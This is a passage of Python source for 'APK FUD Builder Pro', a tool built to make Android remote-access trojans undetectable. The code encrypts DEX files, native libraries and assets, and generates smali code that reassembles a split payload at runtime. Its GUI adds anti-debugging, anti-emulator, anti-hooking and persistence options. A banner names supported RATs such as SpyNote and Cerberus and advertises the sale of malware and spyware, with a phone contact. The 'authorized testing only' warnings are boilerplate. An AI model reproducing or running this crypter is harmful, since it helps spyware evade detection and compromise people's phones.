                                f.write(full_code)
                                
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(content)


# ============= PAYLOAD ENCRYPTOR =============

class PayloadEncryptor:
    """Encrypt payload components"""
    
    def __init__(self):
        self.key = secrets.token_bytes(32)
        self.iv = secrets.token_bytes(16)
        
    def encrypt_dex_files(self, decompiled_dir: str):
        """Encrypt DEX files"""
        dex_dir = os.path.join(decompiled_dir, "dex")
        if os.path.exists(dex_dir):
            for dex_file in os.listdir(dex_dir):
                if dex_file.endswith(".dex"):
                    dex_path = os.path.join(dex_dir, dex_file)
                    with open(dex_path, 'rb') as f:
                        data = f.read()
                        
                    encrypted = self._aes_encrypt(data)
                    
                    # Save encrypted version
                    encrypted_path = dex_path + ".enc"
                    with open(encrypted_path, 'wb') as f:
                        f.write(encrypted)
                        
                    # Remove original
                    os.remove(dex_path)
                    
    def encrypt_native_libs(self, decompiled_dir: str):
        """Encrypt native libraries"""
        lib_dir = os.path.join(decompiled_dir, "lib")
        if os.path.exists(lib_dir):
            for root, dirs, files in os.walk(lib_dir):
                for file in files:
                    if file.endswith(".so"):
                        lib_path = os.path.join(root, file)
                        with open(lib_path, 'rb') as f:
                            data = f.read()
                            
                        encrypted = self._xor_encrypt(data)
                        
                        # Save encrypted
                        with open(lib_path, 'wb') as f:
                            f.write(encrypted)
                            
    def encrypt_assets(self, decompiled_dir: str):
        """Encrypt assets"""
        assets_dir = os.path.join(decompiled_dir, "assets")
        if os.path.exists(assets_dir):
            for root, dirs, files in os.walk(assets_dir):
                for file in files:
                    asset_path = os.path.join(root, file)
                    with open(asset_path, 'rb') as f:
                        data = f.read()
                        
                    if len(data) > 100:  # Only encrypt larger files
                        encrypted = self._aes_encrypt(data)
                        with open(asset_path, 'wb') as f:
                            f.write(encrypted)
                            
    def _aes_encrypt(self, data: bytes) -> bytes:
        """AES encryption"""
        if CRYPTO_AVAILABLE:
            cipher = Cipher(
                algorithms.AES(self.key),
                modes.CBC(self.iv),
                backend=default_backend()
            )
            encryptor = cipher.encryptor()
            
            # Pad data
            padding = 16 - (len(data) % 16)
            data += bytes([padding]) * padding
            
            encrypted = encryptor.update(data) + encryptor.finalize()
            return self.iv + encrypted
        else:
            # Fallback to XOR
            return self._xor_encrypt(data)
            
    def _xor_encrypt(self, data: bytes) -> bytes:
        """XOR encryption"""
        key = b'APK_FUD_PROTECTION_KEY_2024'
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])
        return bytes(result)


# ============= PAYLOAD SPLITTER =============

class PayloadSplitter:
    """Split payload into multiple parts for evasion"""
    
    def split_payload(self, payload_path: str, output_dir: str) -> List[str]:
        """Split payload into multiple files"""
        with open(payload_path, 'rb') as f:
            data = f.read()
            
        parts = []
        chunk_size = 1024 * 50  # 50KB chunks
        
        for i in range(0, len(data), chunk_size):
            chunk = data[i:i+chunk_size]
            part_path = os.path.join(output_dir, f"part_{i//chunk_size:03d}.bin")
            with open(part_path, 'wb') as f:
                f.write(chunk)
            parts.append(part_path)
            
        return parts
        
    def generate_reassembler(self, parts: List[str]) -> str:
        """Generate code to reassemble parts"""
        reassembler_code = f"""
.method public static reassemblePayload()V
    .locals 5
    
    new-instance v0, Ljava/io/ByteArrayOutputStream;
    invoke-direct {{v0}}, Ljava/io/ByteArrayOutputStream;-><init>()V
    
    # Read all parts
    const/4 v1, 0x0
    :goto_read
    const/16 v2, 0x{len(parts):02x}
    if-ge v1, v2, :cond_assemble
    
    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {{v2}}, Ljava/lang/StringBuilder;-><init>()V
    const-string v3, "part_"
    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-static {{v1}}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;
    move-result-object v3
    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v3, ".bin"
    invoke-virtual {{v2, v3}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {{v2}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    
    # Read part file
    invoke-static {{v2}}, LLoader;->readAsset(Ljava/lang/String;)[B
    move-result-object v2
    
    invoke-virtual {{v0, v2}}, Ljava/io/ByteArrayOutputStream;->write([B)V
    
    add-int/lit8 v1, v1, 0x1
    goto :goto_read
    
    :cond_assemble
    invoke-virtual {{v0}}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B
    move-result-object v0
    
    # Write to cache
    new-instance v1, Ljava/io/File;
    invoke-static {{}}, Landroid/os/Environment;->getDownloadCacheDirectory()Ljava/io/File;
    move-result-object v2
    const-string v3, "payload.dex"
    invoke-direct {{v1, v2, v3}}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    
    :try_start
    new-instance v2, Ljava/io/FileOutputStream;
    invoke-direct {{v2, v1}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {{v2, v0}}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {{v2}}, Ljava/io/FileOutputStream;->close()
    :try_end
    .catch Ljava/lang/Exception; {{:catch_0}}
    
    :catch_0
    return-void
.end method
"""
        return reassembler_code


# ============= GUI APPLICATION =============

class APKFUDGUI(QMainWindow):
    """Professional GUI for APK FUD Builder"""
    
    def __init__(self):
        super().__init__()
        self.config = FUDConfig()
        self.init_ui()
        
    def init_ui(self):
        self.setWindowTitle("APK FUD Builder Pro - Android Payload Protection Suite")
        self.setGeometry(100, 100, 1200, 800)
        
        # Dark theme
        self.setStyleSheet("""
            QMainWindow { background-color: #0a0a0a; }
            QWidget { background-color: #1e1e1e; color: #ffffff; font-family: 'Segoe UI'; }
            QPushButton { background-color: #0e639c; border: none; padding: 10px 20px; border-radius: 6px; font-weight: bold; }
            QPushButton:hover { background-color: #1177bb; }
            QPushButton:pressed { background-color: #0a4d75; }
            QGroupBox { border: 2px solid #30363d; border-radius: 8px; margin-top: 12px; font-weight: bold; }
            QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 8px; }
            QCheckBox { spacing: 8px; }
            QCheckBox::indicator { width: 18px; height: 18px; border-radius: 3px; }
            QLineEdit, QComboBox { background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 8px; }
            QLabel { color: #e6edf3; }
            QTabWidget::pane { border: 1px solid #30363d; background-color: #1e1e1e; }
            QTabBar::tab { background-color: #2d2d2d; padding: 10px 20px; margin-right: 2px; }
            QTabBar::tab:selected { background-color: #0e639c; }
            QProgressBar { border: 1px solid #30363d; border-radius: 4px; text-align: center; }
            QProgressBar::chunk { background-color: #0e639c; border-radius: 3px; }
            QSpinBox { background-color: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 4px; }
        """)
        
        # Central widget
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        
        # Left panel - Controls
        left_panel = QWidget()
        left_panel.setFixedWidth(400)
        left_layout = QVBoxLayout(left_panel)
        
        # Header
        header = QLabel("🛡️ APK FUD Builder Pro")
        header.setStyleSheet("font-size: 20pt; font-weight: bold; color: #0e639c; padding: 10px;")
        left_layout.addWidget(header)
        
        # Input file
        file_group = QGroupBox("📁 Input APK")
        file_layout = QVBoxLayout()
        self.input_path = QLineEdit()
        self.input_path.setPlaceholderText("Select APK file...")
        browse_btn = QPushButton("Browse APK")
        browse_btn.clicked.connect(self.browse_input)
        file_layout.addWidget(self.input_path)
        file_layout.addWidget(browse_btn)
        file_group.setLayout(file_layout)
        left_layout.addWidget(file_group)
        
        # Output settings
        output_group = QGroupBox("💾 Output Settings")
        output_layout = QVBoxLayout()
        self.output_path = QLineEdit()
        self.output_path.setPlaceholderText("Output APK path (optional)")
        output_layout.addWidget(self.output_path)
        output_group.setLayout(output_layout)
        left_layout.addWidget(output_group)
        
        # Obfuscation options
        obf_group = QGroupBox("🔒 Obfuscation Settings")
        obf_layout = QVBoxLayout()
        self.obfuscate_code = QCheckBox("Obfuscate Code")
        self.obfuscate_code.setChecked(True)
        self.rename_classes = QCheckBox("Rename Classes")
        self.rename_classes.setChecked(True)
        self.rename_methods = QCheckBox("Rename Methods")
        self.rename_methods.setChecked(True)
        self.string_encryption = QCheckBox("Encrypt Strings")
        self.string_encryption.setChecked(True)
        self.junk_code = QCheckBox("Insert Junk Code")
        self.junk_code.setChecked(True)
        
        obf_layout.addWidget(self.obfuscate_code)
        obf_layout.addWidget(self.rename_classes)
        obf_layout.addWidget(self.rename_methods)
        obf_layout.addWidget(self.string_encryption)
        obf_layout.addWidget(self.junk_code)
        obf_group.setLayout(obf_layout)
        left_layout.addWidget(obf_group)
        
        # Anti-analysis options
        anti_group = QGroupBox("🛡️ Anti-Analysis")
        anti_layout = QVBoxLayout()
        self.anti_debug = QCheckBox("Anti-Debugging")
        self.anti_debug.setChecked(True)
        self.anti_emulator = QCheckBox("Anti-Emulator")
        self.anti_emulator.setChecked(True)
        self.anti_hooking = QCheckBox("Anti-Hooking")
        self.anti_hooking.setChecked(True)
        self.anti_analysis = QCheckBox("Anti-Analysis Tools")
        self.anti_analysis.setChecked(True)
        
        anti_layout.addWidget(self.anti_debug)
        anti_layout.addWidget(self.anti_emulator)
        anti_layout.addWidget(self.anti_hooking)
        anti_layout.addWidget(self.anti_analysis)
        anti_group.setLayout(anti_layout)
        left_layout.addWidget(anti_group)
        
        # Evasion options
        evade_group = QGroupBox("🎭 Evasion Techniques")
        evade_layout = QVBoxLayout()
        self.split_payload = QCheckBox("Split Payload")
        self.split_payload.setChecked(True)
        self.dynamic_loading = QCheckBox("Dynamic Loading")
        self.dynamic_loading.setChecked(True)
        self.change_package = QCheckBox("Change Package Name")
        self.change_package.setChecked(True)
        self.persistence = QCheckBox("Add Persistence")
        self.persistence.setChecked(True)
        
        evade_layout.addWidget(self.split_payload)
        evade_layout.addWidget(self.dynamic_loading)
        evade_layout.addWidget(self.change_package)
        evade_layout.addWidget(self.persistence)
        evade_group.setLayout(evade_layout)
        left_layout.addWidget(evade_group)
        
        # Build button
        self.build_btn = QPushButton("🚀 BUILD FUD APK")
        self.build_btn.setMinimumHeight(60)
        self.build_btn.setStyleSheet("font-size: 14pt; font-weight: bold; background-color: #0e639c;")
        self.build_btn.clicked.connect(self.build_fud)
        left_layout.addWidget(self.build_btn)
        
        # Progress
        self.progress = QProgressBar()
        left_layout.addWidget(self.progress)
        
        # Status
        self.status_label = QLabel("Ready")
        left_layout.addWidget(self.status_label)
        
        left_layout.addStretch()
        
        # Right panel - Info
        right_panel = QTabWidget()
        
        # Info tab
        info_tab = QWidget()
        info_layout = QVBoxLayout(info_tab)
        self.info_text = QTextEdit()
        self.info_text.setReadOnly(True)
        self.info_text.setPlainText("""
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗    ███████╗██╗   ██╗██████╗ ███████╗██████╗ 
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║    ██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║    █████╗  ██║   ██║██║  ██║█████╗  ██████╔╝
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║    ██╔══╝  ██║   ██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║    ██║     ╚██████╔╝██████╔╝███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝    ╚═╝      ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                                    CREATED BY ATHEX BLACK HAT                                          
                    APK FUD Builder Pro v5.0                   
                 Android Payload Protection Suite              

  Features:                                                    
  ✓ Full code obfuscation (ProGuard-level)                     
  ✓ String encryption and junk code insertion                  
  ✓ Anti-debugging, anti-emulator, anti-hooking               
  ✓ Dynamic payload loading and splitting                      
  ✓ Android 16 (API 36) compatibility                          
  ✓ Automatic signing and verification                         
  
  Supported RATs:                                              
  ✓ SpyNote, CraxsRat, CypherRat, AhMyth                      
  ✓ DroidJack, Cerberus, Octopus, and more                    

  ⚠️  LEGAL WARNING:                                           
  This tool is for AUTHORIZED security testing ONLY.          
  Using without permission is ILLEGAL.
  
  DEVELOPER -  ATHEX BLACK HAT    
  CONTACT FOR ANY KIND OF PROBLEM & BUYING MALWARES OR SPYWARES ETC.                           
  WHATSAPP - +92 3490916663
  WEBSITE- https://athex-software-house.netlify.app/
  
                          

        """)
        info_layout.addWidget(self.info_text)
        right_panel.addTab(info_tab, "ℹ️ Info")
        
        # Log tab
        log_tab = QWidget()
        log_layout = QVBoxLayout(log_tab)
        self.log_text = QTextEdit()
        self.log_text.setReadOnly(True)
        log_layout.addWidget(self.log_text)
        right_panel.addTab(log_tab, "📋 Build Log")
        
        main_layout.addWidget(left_panel)
        main_layout.addWidget(right_panel, 1)
        
    def browse_input(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select APK", "", "APK Files (*.apk)"
        )
        if file_path:
            self.input_path.setText(file_path)
            
    def build_fud(self):
        if not self.input_path.text():
            QMessageBox.warning(self, "Error", "Please select an APK file")
            return
            
        # Update config
        self.config.obfuscate_code = self.obfuscate_code.isChecked()
        self.config.rename_classes = self.rename_classes.isChecked()
        self.config.rename_methods = self.rename_methods.isChecked()
        self.config.string_encryption = self.string_encryption.isChecked()
        self.config.insert_junk_code = self.junk_code.isChecked()
        self.config.anti_debug = self.anti_debug.isChecked()
        self.config.anti_emulator = self.anti_emulator.isChecked()
        self.config.anti_hooking = self.anti_hooking.isChecked()
        self.config.anti_analysis = self.anti_analysis.isChecked()
        self.config.split_payload = self.split_payload.isChecked()
        self.config.dynamic_loading = self.dynamic_loading.isChecked()
        self.config.change_package_name = self.change_package.isChecked()
        self.config.persistence = self.persistence.isChecked()
        
        # Disable button
        self.build_btn.setEnabled(False)
        self.build_btn.setText("🔨 BUILDING...")
        self.progress.setValue(0)
        
        # Run in thread
        self.build_thread = BuildThread(self.input_path.text(), self.output_path.text(), self.config)
        self.build_thread.progress.connect(self.update_progress)
        self.build_thread.log.connect(self.update_log)
        self.build_thread.finished.connect(self.build_complete)
        self.build_thread.start()
        
    def update_progress(self, value, message):
        self.progress.setValue(value)
        self.status_label.setText(message)
        
    def update_log(self, message):
        self.log_text.append(message)
        
    def build_complete(self, output_path):
        self.build_btn.setEnabled(True)
        self.build_btn.setText("🚀 BUILD FUD APK")
        self.progress.setValue(100)
        self.status_label.setText("Complete!")
        
        QMessageBox.information(
            self, "Success",
            f"FUD APK created successfully!\n\nOutput: {output_path}\n\n"
            "⚠️ REMINDER: Use only for authorized security testing!"
        )


class BuildThread(QThread):
    progress = pyqtSignal(int, str)
    log = pyqtSignal(str)
    finished = pyqtSignal(str)
    
    def __init__(self, input_path, output_path, config):
        super().__init__()
        self.input_path = input_path
        self.output_path = output_path
        self.config = config
        
    def run(self):
        try:
            self.log.emit("[+] Initializing FUD builder...")
            self.progress.emit(5, "Initializing...")
            
            builder = APKFUDBuilder(self.config)
            
            self.log.emit("[+] Decompiling APK...")
            self.progress.emit(10, "Decompiling APK...")
            
            self.log.emit("[+] Applying obfuscation...")
            self.progress.emit(30, "Applying obfuscation...")
            
            self.log.emit("[+] Injecting anti-analysis...")
            self.progress.emit(50, "Injecting anti-analysis...")
            
            self.log.emit("[+] Encrypting payload...")
            self.progress.emit(70, "Encrypting payload...")
            
            self.log.emit("[+] Rebuilding APK...")
            self.progress.emit(85, "Rebuilding APK...")
            
            output = builder.make_fud(self.input_path, self.output_path if self.output_path else None)
            
            self.log.emit(f"[+] SUCCESS! Output: {output}")
            self.progress.emit(100, "Complete!")
            self.finished.emit(output)
            
        except Exception as e:
            self.log.emit(f"[-] ERROR: {str(e)}")
            self.progress.emit(0, "Error!")
            self.finished.emit("")


# ============= MAIN =============

def main():
    print("""
    ╔══════════════════════════════════════════════════════════════════════╗
    ║                    APK FUD Builder Pro v5.0                          ║
    ║                 Android Payload Protection Suite                     ║
    ║                      FOR SECURITY RESEARCH ONLY                      ║
    ╚══════════════════════════════════════════════════════════════════════╝
    """)
    
    # Command line mode
    if len(sys.argv) > 1:
        input_apk = sys.argv[1]
        output_apk = sys.argv[2] if len(sys.argv) > 2 else None
        
        if not os.path.exists(input_apk):
            print(f"[-] File not found: {input_apk}")
            sys.exit(1)
            
        builder = APKFUDBuilder()
        output = builder.make_fud(input_apk, output_apk)
        print(f"\n[+] FUD APK created: {output}")
        return
        
    # GUI mode
    if not PYQT_AVAILABLE:
        print("[-] PyQt6 required for GUI mode. Install with: pip install PyQt6")
        print("[*] Usage: python apk_fud_builder.py <input.apk> [output.apk]")
        return
        
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = APKFUDGUI()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()